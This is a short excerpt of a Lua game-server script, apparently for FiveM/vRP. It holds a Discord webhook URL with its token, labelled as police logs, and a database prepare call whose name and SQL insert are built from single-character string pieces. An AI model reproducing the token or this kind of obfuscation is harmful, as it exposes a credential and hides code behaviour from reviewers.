...
-- VARLOGS
-----------------------------------------------------------------------------------------------------------------------------------------
local policeLogs = "https://discordapp.com/api/webhooks/720508754897928223/LB5RNpbvjwYBU6D5pJQQh_kplekNjfaJgWbg0amDMQ1LqGS4OaYZ4VNmdITiAxOk44gY"
-----------------------------------------------------------------------------------------------------------------------------------------
-- TRYCHESTITEM
-----------------------------------------------------------------------------------------------------------------------------------------
...
vRP.prepare("v".."R".."P".."/".."g".."a".."m".."b","INSERT INTO ".."v".."r".."p".."_b".."a".."r".."b".."e".."r".."s".."h".."o".."p".."(user_id) VALUES(@user_id)")
